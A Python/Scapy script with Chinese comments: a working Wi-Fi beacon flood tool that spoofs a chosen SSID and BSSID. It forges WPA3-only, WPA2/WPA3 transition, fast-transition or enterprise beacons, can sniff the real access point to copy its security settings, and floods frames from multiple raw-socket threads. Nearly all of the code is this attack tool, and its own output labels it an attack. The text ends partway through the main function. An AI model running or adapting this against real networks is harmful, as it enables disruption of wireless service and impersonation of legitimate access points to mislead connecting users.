#!/usr/bin/env python3
"""
WPA2/WPA3 Transition Mode Beacon Flood
支持纯WPA3 / 过渡模式 / 自动嗅探模式匹配
"""

from scapy.all import *
import random
import string
import threading
import time
import subprocess
import sys
import os
import struct
import socket
import argparse

# ==================== 配置区 ====================

CONFIG = {
    'target_mac':  'ff:ff:ff:ff:ff:ff',   # 广播(Beacon必须)
    'ap_mac':      'BB:BB:BB:BB:BB:BB',   # 伪造的AP MAC
    'ssid':        'TargetNetwork',        # 目标SSID
    'interface':   'wlan0',             # Monitor模式接口
    'channel':     5,                      # 信道
    'threads':     4,                      # 发送线程数
    'mode':        'transition',           # wpa3_only / transition / auto
    'beacon_interval': 100,                # Beacon间隔(TU)
    'randomize_seq':   True,               # 随机序列号
    'use_raw_socket':  True,               # 使用原始套接字(高性能)
}

# ==================== 全局状态 ====================

stats_lock = threading.Lock()
stats = {
    'sent':       0,
    'errors':     0,
    'start_time': None,
    'running':    True,
}


# ==================== 工具函数 ====================

def log_info(msg):
    print(f"[*] {msg}")

def log_ok(msg):
    print(f"[+] {msg}")

def log_err(msg):
    print(f"[!] {msg}")

def log_warn(msg):
    print(f"[~] {msg}")


def check_root():
    """检查root权限"""
    if os.geteuid() != 0:
        log_err("需要root权限运行")
        sys.exit(1)


def check_monitor_mode(iface):
    """验证网卡处于Monitor模式"""
    try:
        result = subprocess.run(
            ['iwconfig', iface],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode != 0:
            log_err(f"接口 {iface} 不存在")
            sys.exit(1)
        if 'Monitor' not in result.stdout:
            log_err(f"{iface} 未处于Monitor模式")
            log_info(f"请先执行: airmon-ng start {iface}")
            sys.exit(1)
        log_ok(f"接口 {iface} 已确认Monitor模式")
    except FileNotFoundError:
        log_err("未找到iwconfig命令，请安装wireless-tools")
        sys.exit(1)


def set_channel(iface, channel):
    """安全设置信道"""
    channel = int(channel)
    if channel < 1 or channel > 196:
        log_err(f"无效信道: {channel}")
        sys.exit(1)

    ret = subprocess.run(
        ['iwconfig', iface, 'channel', str(channel)],
        capture_output=True, text=True
    )
    if ret.returncode != 0:
        log_err(f"信道设置失败: {ret.stderr.strip()}")
        sys.exit(1)
    log_ok(f"信道已设置为 {channel}")


def get_timestamp():
    """生成微秒级时间戳(模拟AP运行时间)"""
    return int(time.time() * 1000000) & 0xFFFFFFFFFFFFFFFF


def random_seq():
    """生成随机序列控制号"""
    frag = 0
    seq  = random.randint(0, 4095)
    return (seq << 4) | frag


# ==================== RSN 构造器 ====================

class RSNBuilder:
    """
    IEEE 802.11 RSN Information Element 构造器
    完整支持WPA2/WPA3各种模式
    """

    # OUI: 00:0F:AC
    OUI = b'\x00\x0f\xac'

    # ---- Cipher Suite Types ----
    CIPHER_CCMP_128   = OUI + b'\x04'   # AES-CCMP-128
    CIPHER_GCMP_128   = OUI + b'\x08'   # AES-GCMP-128
    CIPHER_CCMP_256   = OUI + b'\x0a'   # AES-CCMP-256
    CIPHER_GCMP_256   = OUI + b'\x09'   # AES-GCMP-256

    # ---- AKM Suite Types ----
    AKM_PSK           = OUI + b'\x02'   # WPA2-Personal (PSK)
    AKM_PSK_SHA256    = OUI + b'\x06'   # WPA2-PSK-SHA256
    AKM_SAE           = OUI + b'\x08'   # WPA3-Personal (SAE)
    AKM_FT_SAE        = OUI + b'\x09'   # FT over SAE
    AKM_EAP           = OUI + b'\x01'   # WPA2-Enterprise
    AKM_EAP_SHA256    = OUI + b'\x05'   # WPA3-Enterprise
    AKM_SUITE_B_192   = OUI + b'\x0c'   # WPA3-Enterprise 192-bit
    AKM_OWE           = OUI + b'\x12'   # Opportunistic Wireless Encryption

    # ---- Group Management Cipher ----
    BIP_CMAC_128      = OUI + b'\x06'   # BIP-CMAC-128 (WPA3标准)
    BIP_GMAC_128      = OUI + b'\x0b'   # BIP-GMAC-128
    BIP_GMAC_256      = OUI + b'\x0c'   # BIP-GMAC-256
    BIP_CMAC_256      = OUI + b'\x0d'   # BIP-CMAC-256

    @staticmethod
    def _encode_rsn_capabilities(
        preauth=False,
        ptksa_replay=1,      # 0=1, 1=4, 2=16, 3=64 counters
        gtksa_replay=1,
        mfp_required=False,
        mfp_capable=False,
        joint_multiband=False,
        peerkey=False,
        spp_amsdu_capable=False,
        spp_amsdu_required=False,
        pbac=False,
        ext_key_id=False,
        ocvc=False,           # Operating Channel Validation
    ):
        """编码RSN Capabilities (2字节 little-endian)"""

        word = 0
        if preauth:
            word |= (1 << 0)
        # bits 1: no-pairwise (reserved, always 0)
        word |= (ptksa_replay & 0x03) << 2
        word |= (gtksa_replay & 0x03) << 4
        if mfp_required:
            word |= (1 << 6)
        if mfp_capable:
            word |= (1 << 7)
        if joint_multiband:
            word |= (1 << 8)
        if peerkey:
            word |= (1 << 9)
        if spp_amsdu_capable:
            word |= (1 << 10)
        if spp_amsdu_required:
            word |= (1 << 11)
        if pbac:
            word |= (1 << 12)
        if ext_key_id:
            word |= (1 << 13)
        if ocvc:
            word |= (1 << 14)

        return struct.pack('<H', word)

    @classmethod
    def build_wpa3_only(cls):
        """
        纯WPA3-Personal (SAE Only)
        - AKM: SAE
        - MFP: Required + Capable
        - Group Management: BIP-CMAC-128
        """
        rsn_cap = cls._encode_rsn_capabilities(
            ptksa_replay=1,
            gtksa_replay=1,
            mfp_required=True,
            mfp_capable=True,
        )

        info = b''
        info += b'\x01\x00'                # RSN Version 1
        info += cls.CIPHER_CCMP_128         # Group Data Cipher
        info += struct.pack('<H', 1)        # Pairwise Count
        info += cls.CIPHER_CCMP_128         # Pairwise Cipher
        info += struct.pack('<H', 1)        # AKM Count
        info += cls.AKM_SAE                 # AKM: SAE
        info += rsn_cap                     # RSN Capabilities
        info += struct.pack('<H', 0)        # PMKID Count: 0
        info += cls.BIP_CMAC_128            # Group Management Cipher

        return Dot11Elt(ID=48, info=info)

    @classmethod
    def build_transition(cls):
        """
        WPA2/WPA3 过渡模式 (Transition Mode)
        - AKM: PSK + SAE (双AKM)
        - MFP: Capable (非Required，兼容WPA2客户端)
        - Group Management: BIP-CMAC-128
        """
        rsn_cap = cls._encode_rsn_capabilities(
            ptksa_replay=1,
            gtksa_replay=1,
            mfp_required=False,    # 过渡模式不强制MFP
            mfp_capable=True,      # 但声明支持MFP
        )

        info = b''
        info += b'\x01\x00'                # RSN Version 1
        info += cls.CIPHER_CCMP_128         # Group Data Cipher: CCMP
        info += struct.pack('<H', 1)        # Pairwise Count: 1
        info += cls.CIPHER_CCMP_128         # Pairwise: CCMP
        info += struct.pack('<H', 2)        # AKM Count: 2 ← 关键：双AKM
        info += cls.AKM_PSK                 # AKM 1: WPA2-PSK
        info += cls.AKM_SAE                 # AKM 2: WPA3-SAE
        info += rsn_cap                     # RSN Capabilities
        info += struct.pack('<H', 0)        # PMKID Count: 0
        info += cls.BIP_CMAC_128            # Group Management Cipher

        return Dot11Elt(ID=48, info=info)

    @classmethod
    def build_transition_ft(cls):
        """
        WPA2/WPA3 过渡模式 + Fast Transition
        - AKM: PSK + SAE + FT-SAE (三AKM)
        - 支持802.11r快速漫游
        """
        rsn_cap = cls._encode_rsn_capabilities(
            ptksa_replay=1,
            gtksa_replay=1,
            mfp_required=False,
            mfp_capable=True,
        )

        info = b''
        info += b'\x01\x00'                # RSN Version
        info += cls.CIPHER_CCMP_128         # Group Cipher
        info += struct.pack('<H', 1)        # Pairwise Count
        info += cls.CIPHER_CCMP_128         # Pairwise Cipher
        info += struct.pack('<H', 3)        # AKM Count: 3
        info += cls.AKM_PSK                 # AKM 1: PSK
        info += cls.AKM_SAE                 # AKM 2: SAE
        info += cls.AKM_FT_SAE             # AKM 3: FT-SAE
        info += rsn_cap                     # RSN Cap
        info += struct.pack('<H', 0)        # PMKID Count
        info += cls.BIP_CMAC_128            # Group Mgmt Cipher

        return Dot11Elt(ID=48, info=info)

    @classmethod
    def build_enterprise(cls):
        """WPA3-Enterprise"""
        rsn_cap = cls._encode_rsn_capabilities(
            ptksa_replay=1,
            gtksa_replay=1,
            mfp_required=True,
            mfp_capable=True,
        )

        info = b''
        info += b'\x01\x00'
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 1)
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 1)
        info += cls.AKM_EAP_SHA256
        info += rsn_cap
        info += struct.pack('<H', 0)
        info += cls.BIP_CMAC_128

        return Dot11Elt(ID=48, info=info)


# ==================== IE 构造器 ====================

class IEBuilder:
    """802.11 Information Element 构造工具集"""

    @staticmethod
    def ssid(name):
        """SSID (ID=0)"""
        if isinstance(name, str):
            name = name.encode('utf-8')
        return Dot11Elt(ID=0, info=name)

    @staticmethod
    def supported_rates():
        """Supported Rates (ID=1) — 802.11b/g 基础速率"""
        rates = bytes([
            0x82,   # 1   Mbps  (basic)
            0x84,   # 2   Mbps  (basic)
            0x8b,   # 5.5 Mbps  (basic)
            0x96,   # 11  Mbps  (basic)
            0x0c,   # 6   Mbps
            0x12,   # 9   Mbps
            0x18,   # 12  Mbps
            0x24,   # 18  Mbps
        ])
        return Dot11Elt(ID=1, info=rates)

    @staticmethod
    def ds_parameter(channel):
        """DS Parameter Set (ID=3)"""
        return Dot11Elt(ID=3, info=bytes([channel & 0xFF]))

    @staticmethod
    def tim():
        """Traffic Indication Map (ID=5) — 最简TIM"""
        tim_info = bytes([
            0x00,   # DTIM Count
            0x01,   # DTIM Period
            0x00,   # Bitmap Control
            0x00,   # Partial Virtual Bitmap
        ])
        return Dot11Elt(ID=5, info=tim_info)

    @staticmethod
    def country(code='US'):
        """Country IE (ID=7)"""
        # 国家码 + 频段三元组
        info = code.encode('ascii') + b'\x20'  # 环境: Indoor/Outdoor
        # 三元组: First Channel, Num Channels, Max TX Power
        info += bytes([1, 11, 30])   # 2.4GHz: Ch1-11, 30dBm
        if len(info) % 2 == 1:
            info += b'\x00'          # Padding
        return Dot11Elt(ID=7, info=info)

    @staticmethod
    def extended_rates():
        """Extended Supported Rates (ID=50) — 802.11g 扩展速率"""
        rates = bytes([
            0x30,   # 24 Mbps
            0x48,   # 36 Mbps
            0x60,   # 48 Mbps
            0x6c,   # 54 Mbps
        ])
        return Dot11Elt(ID=50, info=rates)

    @staticmethod
    def ht_capabilities():
        """
        HT Capabilities (ID=45) — 802.11n
        26字节标准长度
        """
        ht_cap_info    = struct.pack('<H', 0x402d)   # HT Cap Info
        ampdu_params   = b'\x17'                     # A-MPDU Params
        # Supported MCS Set (16 bytes)
        mcs_set = (
            b'\xff\xff\x00\x00'    # Rx MCS Bitmask (MCS 0-15)
            b'\x00\x00\x00\x00'
            b'\x00\x00\x00\x00'
            b'\x01\x00\x00\x00'    # Tx MCS defined
        )
        ht_ext_cap     = struct.pack('<H', 0x0000)
        txbf_cap       = struct.pack('<I', 0x00000000)
        asel_cap       = b'\x00'

        info = (
            ht_cap_info +
            ampdu_params +
            mcs_set +
            ht_ext_cap +
            txbf_cap +
            asel_cap
        )
        return Dot11Elt(ID=45, info=info)

    @staticmethod
    def ht_information(channel):
        """HT Information (ID=61) — 802.11n 操作信息"""
        primary_channel = channel & 0xFF
        ht_info_subset1 = b'\x00'              # Secondary channel offset: none
        ht_info_subset2 = struct.pack('<H', 0)
        ht_info_subset3 = struct.pack('<H', 0)
        basic_mcs = b'\x00' * 16

        info = (
            bytes([primary_channel]) +
            ht_info_subset1 +
            ht_info_subset2 +
            ht_info_subset3 +
            basic_mcs
        )
        return Dot11Elt(ID=61, info=info)

    @staticmethod
    def extended_capabilities():
        """
        Extended Capabilities (ID=127)
        8字节，标记AP支持的扩展功能
        """
        ext_cap = bytearray(8)
        # Bit 2:  Extended Channel Switching
        ext_cap[0] |= 0x04
        # Bit 19: BSS Transition (802.11v)
        ext_cap[2] |= 0x08
        # Bit 46: Operating Mode Notification (802.11ac)
        ext_cap[5] |= 0x40
        # Bit 70: FTM Responder
        ext_cap[8 - 1] |= 0x40

        return Dot11Elt(ID=127, info=bytes(ext_cap))

    @staticmethod
    def rsnxe(sae_h2e=True, sae_pk=False):
        """
        RSNXE — RSN Extension Element (ID=244)
        WPA3 SAE 专用，指示支持的SAE特性

        Bits:
          0: Protected TWT Operations
          1: SAE Hash-to-Element (H2E)
          2: (reserved)
          3: SAE-PK
          4: (reserved)
          5: Secure LTF
          6: Secure RTT
          7: PROT Range Negotiation
        """
        # 第一个nibble = field length indicator (0x2 = 2 bits used => 1 byte content)
        rsnxe_byte = 0x00
        if sae_h2e:
            rsnxe_byte |= 0x20   # Bit 5 of byte (encoding: length nibble + flags)
        if sae_pk:
            rsnxe_byte |= 0x40

        # RSNXE格式: 高4位=长度指示(0), 低4位=能力位
        # 实际编码: 第一字节高nibble是字段长度, 低nibble开始是capability位
        rsnxe_info = bytes([rsnxe_byte])
        return Dot11Elt(ID=244, info=rsnxe_info)

    @staticmethod
    def vendor_wpa(transition=True):
        """
        WPA IE (Vendor Specific, ID=221)
        过渡模式下某些旧客户端需要此IE
        Microsoft OUI: 00:50:F2
        """
        if not transition:
            return None

        # WPA IE (仅用于向后兼容)
        wpa_oui   = b'\x00\x50\xf2'
        wpa_type  = b'\x01'
        wpa_ver   = b'\x01\x00'
        group_cs  = wpa_oui + b'\x04'      # CCMP
        pw_count  = b'\x01\x00'
        pw_cs     = wpa_oui + b'\x04'      # CCMP
        akm_count = b'\x01\x00'
        akm_cs    = wpa_oui + b'\x02'      # PSK

        info = (
            wpa_oui + wpa_type +
            wpa_ver +
            group_cs +
            pw_count + pw_cs +
            akm_count + akm_cs
        )
        return Dot11Elt(ID=221, info=info)

    @staticmethod
    def wmm():
        """
        WMM/WME Parameter Element (Vendor Specific, ID=221)
        大多数现代AP都会广播此IE
        """
        # Microsoft OUI + WMM type + subtype
        oui_type = b'\x00\x50\xf2\x02\x01\x01'
        # QoS Info + Reserved
        qos_info = b'\x80'   # U-APSD supported

        # AC Parameters (4 ACs × 4 bytes each)
        # AC_BE (Best Effort)
        ac_be = bytes([0x03, 0xa4, 0x00, 0x00])
        # AC_BK (Background)
        ac_bk = bytes([0x27, 0xa4, 0x00, 0x00])
        # AC_VI (Video)
        ac_vi = bytes([0x42, 0x43, 0x5e, 0x00])
        # AC_VO (Voice)
        ac_vo = bytes([0x62, 0x32, 0x2f, 0x00])

        info = oui_type + qos_info + b'\x00' + ac_be + ac_bk + ac_vi + ac_vo
        return Dot11Elt(ID=221, info=info)


# ==================== AP 信息嗅探 ====================

class APSniffer:
    """
    嗅探真实AP的Beacon帧以获取精确配置
    用于auto模式
    """

    def __init__(self, iface, target_bssid=None, target_ssid=None, timeout=10):
        self.iface       = iface
        self.target_bssid = target_bssid.lower() if target_bssid else None
        self.target_ssid  = target_ssid
        self.timeout      = timeout
        self.result       = None

    def _packet_handler(self, pkt):
        """处理捕获的数据包"""
        if not pkt.haslayer(Dot11Beacon):
            return

        bssid = pkt[Dot11].addr2
        if not bssid:
            return

        # 匹配目标
        if self.target_bssid and bssid.lower() != self.target_bssid:
            return

        # 提取SSID
        ssid_elt = pkt.getlayer(Dot11Elt, ID=0)
        if ssid_elt:
            try:
                ssid = ssid_elt.info.decode('utf-8', errors='ignore')
            except:
                ssid = ''
            if self.target_ssid and ssid != self.target_ssid:
                return

        # 提取RSN信息
        rsn_elt = pkt.getlayer(Dot11Elt, ID=48)
        has_wpa3 = False
        has_wpa2 = False
        is_transition = False

        if rsn_elt and rsn_elt.info:
            rsn_data = rsn_elt.info
            # 简单解析AKM
            hex_data = rsn_data.hex()
            if '000fac08' in hex_data:
                has_wpa3 = True
            if '000fac02' in hex_data:
                has_wpa2 = True
            is_transition = has_wpa2 and has_wpa3

        # 提取信道
        ds_elt = pkt.getlayer(Dot11Elt, ID=3)
        channel = ds_elt.info[0] if ds_elt and ds_elt.info else 0

        # 检查RSNXE
        rsnxe_elt = pkt.getlayer(Dot11Elt, ID=244)
        has_rsnxe = rsnxe_elt is not None

        self.result = {
            'bssid':         bssid,
            'ssid':          ssid,
            'channel':       channel,
            'has_wpa3':      has_wpa3,
            'has_wpa2':      has_wpa2,
            'is_transition': is_transition,
            'has_rsnxe':     has_rsnxe,
            'raw_rsn':       rsn_elt.info if rsn_elt else None,
            'beacon_raw':    pkt,
        }

    def scan(self):
        """执行嗅探"""
        log_info(f"嗅探目标AP信息 (超时: {self.timeout}s)...")

        try:
            sniff(
                iface=self.iface,
                prn=self._packet_handler,
                stop_filter=lambda p: self.result is not None,
                timeout=self.timeout,
                store=False,
            )
        except Exception as e:
            log_err(f"嗅探失败: {e}")
            return None

        if self.result:
            r = self.result
            log_ok(f"找到目标AP:")
            log_info(f"  BSSID    : {r['bssid']}")
            log_info(f"  SSID     : {r['ssid']}")
            log_info(f"  信道     : {r['channel']}")
            log_info(f"  WPA2     : {'是' if r['has_wpa2'] else '否'}")
            log_info(f"  WPA3     : {'是' if r['has_wpa3'] else '否'}")
            log_info(f"  过渡模式 : {'是' if r['is_transition'] else '否'}")
            log_info(f"  RSNXE    : {'是' if r['has_rsnxe'] else '否'}")
        else:
            log_warn("未找到目标AP")

        return self.result


# ==================== 帧构造器 ====================

class BeaconBuilder:
    """
    高仿真 Beacon 帧构造器
    IE 顺序严格遵循 802.11 规范
    """

    # 802.11 规范定义的 Beacon IE 标准顺序
    IE_ORDER = """
    规范要求的Beacon帧IE顺序:
    ├─ SSID                    (ID=0)
    ├─ Supported Rates         (ID=1)
    ├─ DS Parameter Set        (ID=3)
    ├─ TIM                     (ID=5)
    ├─ Country                 (ID=7)
    ├─ BSS Load                (ID=11)      [可选]
    ├─ Power Constraint        (ID=32)      [可选]
    ├─ HT Capabilities         (ID=45)
    ├─ RSN                     (ID=48)
    ├─ Extended Rates          (ID=50)
    ├─ HT Information          (ID=61)
    ├─ Extended Capabilities   (ID=127)
    ├─ Vendor Specific / WMM   (ID=221)
    └─ RSNXE                   (ID=244)
    """

    def __init__(self, config):
        self.config = config
        self.seq_counter = 0

    def _next_seq(self):
        """生成序列号"""
        if self.config['randomize_seq']:
            return random_seq()
        else:
            self.seq_counter = (self.seq_counter + 1) % 4096
            return self.seq_counter << 4

    def build(self, mode=None):
        """
        构造完整的Beacon帧

        参数:
            mode: 'wpa3_only'      纯WPA3
                  'transition'     WPA2/WPA3过渡模式
                  'transition_ft'  过渡模式+快速漫游
                  'enterprise'     WPA3企业版
        """
        if mode is None:
            mode = self.config['mode']

        cfg = self.config
        channel = cfg['channel']
        is_transition = mode in ('transition', 'transition_ft')

        # ========== 802.11 MAC Header ==========
        dot11 = Dot11(
            type=0,          # Management
            subtype=8,       # Beacon
            addr1='ff:ff:ff:ff:ff:ff',   # Destination: 广播
            addr2=cfg['ap_mac'],          # Source: AP MAC
            addr3=cfg['ap_mac'],          # BSSID
            SC=self._next_seq(),
        )

        # ========== Beacon Fixed Fields ==========
        beacon = Dot11Beacon(
            timestamp=get_timestamp(),
            beacon_interval=cfg['beacon_interval'],
            cap='ESS+privacy',            # ESS + Privacy(加密)
        )

        # ========== RSN Element ==========
        if mode == 'wpa3_only':
            rsn = RSNBuilder.build_wpa3_only()
        elif mode == 'transition':
            rsn = RSNBuilder.build_transition()
        elif mode == 'transition_ft':
            rsn = RSNBuilder.build_transition_ft()
        elif mode == 'enterprise':
            rsn = RSNBuilder.build_enterprise()
        else:
            rsn = RSNBuilder.build_transition()

        # ========== 按规范顺序组装IE ==========
        frame = (
            RadioTap() /
            dot11 /
            beacon /
            IEBuilder.ssid(cfg['ssid']) /                    # ID=0
            IEBuilder.supported_rates() /                     # ID=1
            IEBuilder.ds_parameter(channel) /                 # ID=3
            IEBuilder.tim() /                                 # ID=5
            IEBuilder.country() /                             # ID=7
            IEBuilder.ht_capabilities() /                     # ID=45
            rsn /                                             # ID=48
            IEBuilder.extended_rates() /                      # ID=50
            IEBuilder.ht_information(channel) /               # ID=61
            IEBuilder.extended_capabilities() /               # ID=127
            IEBuilder.wmm()                                   # ID=221 (WMM)
        )

        # 过渡模式添加WPA IE (向后兼容)
        if is_transition:
            wpa_ie = IEBuilder.vendor_wpa(transition=True)
            if wpa_ie:
                frame = frame / wpa_ie

        # WPA3模式添加RSNXE
        if mode in ('wpa3_only', 'transition', 'transition_ft'):
            frame = frame / IEBuilder.rsnxe(
                sae_h2e=True,
                sae_pk=False,
            )

        return frame


# ==================== 发送引擎 ====================

class FloodEngine:
    """多线程发送引擎"""

    def __init__(self, config, builder):
        self.config  = config
        self.builder = builder
        self.threads = []

    def _worker_raw_socket(self):
        """原始套接字发送线程 (高性能)"""
        try:
            sock = socket.socket(
                socket.AF_PACKET,
                socket.SOCK_RAW,
                socket.htons(0x0003)
            )
            sock.bind((self.config['interface'], 0))
        except Exception as e:
            log_err(f"套接字创建失败: {e}")
            return

        local_count = 0
        batch_size  = 100    # 每批次统计一次，减少锁竞争

        while stats['running']:
            try:
                frame = self.builder.build()
                sock.send(bytes(frame))
                local_count += 1

                if local_count >= batch_size:
                    with stats_lock:
                        stats['sent'] += local_count
                    local_count = 0

            except Exception as e:
                with stats_lock:
                    stats['errors'] += 1
                time.sleep(0.01)

        # 线程退出前提交剩余计数
        if local_count > 0:
            with stats_lock:
                stats['sent'] += local_count

        sock.close()

    def _worker_scapy(self):
        """Scapy sendp发送线程 (兼容性好)"""
        local_count = 0
        batch_size  = 50

        while stats['running']:
            try:
                # 批量构造
                frames = [self.builder.build() for _ in range(10)]
                sendp(frames, iface=self.config['interface'],
                      verbose=False, inter=0)
                local_count += 10

                if local_count >= batch_size:
                    with stats_lock:
                        stats['sent'] += local_count
                    local_count = 0

            except Exception as e:
                with stats_lock:
                    stats['errors'] += 1
                time.sleep(0.01)

        if local_count > 0:
            with stats_lock:
                stats['sent'] += local_count

    def _stats_printer(self):
        """统计信息输出线程"""
        mode_names = {
            'wpa3_only':     'WPA3-Only (SAE)',
            'transition':    'WPA2/WPA3 Transition',
            'transition_ft': 'WPA2/WPA3 + FT',
            'enterprise':    'WPA3-Enterprise',
        }
        mode_name = mode_names.get(self.config['mode'], self.config['mode'])

        while stats['running']:
            time.sleep(1)
            if not stats['running']:
                break

            elapsed = time.time() - stats['start_time']
            with stats_lock:
                sent   = stats['sent']
                errors = stats['errors']

            rate = sent / elapsed if elapsed > 0 else 0

            print(
                f"
[{'=' * 50}] "
                f"模式: {mode_name} | "
                f"已发送: {sent:>8,d} | "
                f"速率: {rate:>7,.0f} pps | "
                f"错误: {errors:>4d} | "
                f"运行: {elapsed:>5.0f}s",
                end='', flush=True
            )

    def start(self):
        """启动所有线程"""
        stats['start_time'] = time.time()
        stats['running']    = True

        # 选择发送方式
        if self.config['use_raw_socket']:
            worker_fn = self._worker_raw_socket
            log_info("使用原始套接字发送 (高性能模式)")
        else:
            worker_fn = self._worker_scapy
            log_info("使用Scapy sendp发送 (兼容模式)")

        # 启动发送线程
        for i in range(self.config['threads']):
            t = threading.Thread(
                target=worker_fn,
                name=f"FloodWorker-{i}",
                daemon=True
            )
            t.start()
            self.threads.append(t)
        log_ok(f"已启动 {self.config['threads']} 个发送线程")

        # 启动统计线程
        t_stats = threading.Thread(
            target=self._stats_printer,
            name="StatsPrinter",
            daemon=True
        )
        t_stats.start()

    def stop(self):
        """停止所有线程"""
        stats['running'] = False
        time.sleep(0.5)

        elapsed = time.time() - stats['start_time']
        sent    = stats['sent']
        errors  = stats['errors']
        rate    = sent / elapsed if elapsed > 0 else 0

        print(f"
")
        print(f"{'=' * 60}")
        print(f"  攻击结束 — 统计摘要")
        print(f"{'=' * 60}")
        print(f"  模式       : {self.config['mode']}")
        print(f"  目标SSID   : {self.config['ssid']}")
        print(f"  伪造BSSID  : {self.config['ap_mac']}")
        print(f"  总发送帧   : {sent:,d}")
        print(f"  总错误数   : {errors:,d}")
        print(f"  运行时间   : {elapsed:.1f} 秒")
        print(f"  平均速率   : {rate:,.0f} pps")
        print(f"{'=' * 60}")


# ==================== 帧验证 ====================

def validate_frame(builder):
    """构造一帧并验证其结构"""
    frame = builder.build()
    raw   = bytes(frame)

    log_info(f"帧验证:")
    log_info(f"  总长度     : {len(raw)} bytes")

    # 检查关键层
    checks = {
        'RadioTap':     frame.haslayer(RadioTap),
        'Dot11':        frame.haslayer(Dot11),
        'Dot11Beacon':  frame.haslayer(Dot11Beacon),
    }

    # 检查关键IE
    ie_checks = {
        'SSID (ID=0)':         False,
        'Rates (ID=1)':        False,
        'DS (ID=3)':           False,
        'RSN (ID=48)':         False,
        'HT Cap (ID=45)':      False,
        'Ext Cap (ID=127)':    False,
        'RSNXE (ID=244)':      False,
    }

    ie_id_map = {0: 'SSID (ID=0)', 1: 'Rates (ID=1)', 3: 'DS (ID=3)',
                 48: 'RSN (ID=48)', 45: 'HT Cap (ID=45)',
                 127: 'Ext Cap (ID=127)', 244: 'RSNXE (ID=244)'}

    elt = frame.getlayer(Dot11Elt)
    while elt:
        if elt.ID in ie_id_map:
            ie_checks[ie_id_map[elt.ID]] = True
        elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

    all_ok = True
    for name, present in {**checks, **ie_checks}.items():
        status = "✅" if present else "❌"
        if not present:
            all_ok = False
        log_info(f"  {status} {name}")

    # RSN内容验证
    rsn_elt = frame.getlayer(Dot11Elt, ID=48)
    if rsn_elt and rsn_elt.info:
        hex_str = rsn_elt.info.hex()
        akm_sae = '000fac08' in hex_str
        akm_psk = '000fac02' in hex_str
        bip     = '000fac06' in hex_str
        log_info(f"  RSN 详情:")
        log_info(f"    {'✅' if akm_sae else '❌'} AKM-SAE (WPA3)")
        log_info(f"    {'✅' if akm_psk else '⬜'} AKM-PSK (WPA2)")
        log_info(f"    {'✅' if bip else '❌'} BIP-CMAC-128 (Group Mgmt)")
        log_info(f"    RSN长度: {len(rsn_elt.info)} bytes")

        if not bip:
            log_warn("  ⚠️  缺少Group Management Cipher，WPA3客户端可能忽略此帧")
            all_ok = False

    if all_ok:
        log_ok("帧验证通过")
    else:
        log_warn("帧验证存在缺失项")

    return all_ok


# ==================== 主程序 ====================

def parse_args():
    """命令行参数解析"""
    parser = argparse.ArgumentParser(
        description='WPA2/WPA3 Transition Mode Beacon Flood Tool',
        formatter_class=argparse.RawTextHelpFormatter,
    )

    parser.add_argument('-i', '--interface', default=CONFIG['interface'],
                        help=f"Monitor模式接口 (默认: {CONFIG['interface']})")
    parser.add_argument('-b', '--bssid', default=CONFIG['ap_mac'],
                        help=f"伪造的AP MAC (默认: {CONFIG['ap_mac']})")
    parser.add_argument('-s', '--ssid', default=CONFIG['ssid'],
                        help=f"目标SSID (默认: {CONFIG['ssid']})")
    parser.add_argument('-c', '--channel', type=int, default=CONFIG['channel'],
                        help=f"信道 (默认: {CONFIG['channel']})")
    parser.add_argument('-t', '--threads', type=int, default=CONFIG['threads'],
                        help=f"发送线程数 (默认: {CONFIG['threads']})")
    parser.add_argument('-m', '--mode', default=CONFIG['mode'],
                        choices=['wpa3_only', 'transition', 'transition_ft',
                                 'enterprise', 'auto'],
                        help="攻击模式:
"
                             "  wpa3_only     — 纯WPA3 SAE
"
                             "  transition    — WPA2/WPA3过渡模式
"
                             "  transition_ft — 过渡模式+FT漫游
"
                             "  enterprise    — WPA3企业版
"
                             "  auto          — 嗅探后自动匹配
"
                             f"  (默认: {CONFIG['mode']})")
    parser.add_argument('--scapy', action='store_true',
                        help="使用Scapy发送(默认使用原始套接字)")
    parser.add_argument('--validate', action='store_true',
                        help="仅验证帧结构，不发送")
    parser.add_argument('--scan-timeout', type=int, default=10,
                        help="auto模式嗅探超时(秒)")

    return parser.parse_args()


def main():
    args = parse_args()

    # 更新配置
    CONFIG['interface']      = args.interface
    CONFIG['ap_mac']         = args.bssid
    CONFIG['ssid']           = args.ssid
    CONFIG['channel']        = args.channel
    CONFIG['threads']        = args.threads
    CONFIG['mode']           = args.mode
    CONFIG['use_raw_socket'] = not args.scapy

    # Banner
    print()
    print(f"{'=' * 60}")
    print(f"  WPA2/WPA3 Transition Beacon Flood")
    print(f"{'=' * 60}")

    # 权限检查
    check_root()

    # 接口检查
    check_monitor_mode(CONFIG['interface'])

    # 设置信道
    set_channel(CONFIG['interface'], CONFIG['channel'])

    # Auto模式：嗅探真实AP
    if CONFIG['mode'] == 'auto':
        sniffer = APSniffer(
            iface=CONFIG['interface'],
            target_bssid=CONFIG['ap_mac'],
            target_ssid=CONFIG['ssid'],
            timeout=args.scan_timeout,
        )
        result = sniffer.scan()

        if result:
            # 自动选择模式
            if result['is_transition']:
                CONFIG['mode'] = 'transition'
            elif result['has_wpa3']:
                CONFIG['mode'] = 'wpa3_only'
            else:
                CONFIG['mode'] = 'transition'   # 默认用过渡模式
                log_warn("未检测到WPA3，使用过渡模式")

            # 更新信道
            if result['channel'] > 0:
                CONFIG['channel'] = result['channel']
                set_channel(CONFIG['interface'], CONFIG['channel'])

            log_ok(f"自动选择模式: {CONFIG['mode']}")
        else:
            log_warn("嗅探失败，使用默认过渡模式")
            CONFIG['mode'] = 'transition'

    # 打印配置
    mode_desc = {
        'wpa3_only':     'WPA3-Only (SAE + MFP Required)',
        'transition':    'WPA2/WPA3 Transition (PSK+SAE, MFP Capable)',
        'transition_ft': 'WPA2/WPA3 + Fast Transition (PSK+SAE+FT)',
        'enterprise':    'WPA3-Enterprise (EAP-SHA256)',
    }

    print()
    log_info(f"配置信息:")
    log_info(f"  接口       : {CONFIG['interface']}")
    log_info(f"  伪造BSSID  : {CONFIG['ap_mac']}")
    log_info(f"  SSID       : {CONFIG['ssid']}")
    log_info(f"  信道       : {CONFIG['channel']}")
    log_info(f"  线程数     : {CONFIG['threads']}")
    log_info(f"  模式       : {mode_desc.get(CONFIG['mode'], CONFIG['mode'])}")
    log_info(f"  发送方式   : {'原始套接字' if CONFIG['use_raw_socket'] else 'Scapy sendp'}")
    print()

    # 构造器
    builder = BeaconBuilder(CONFIG)

    # 帧验证
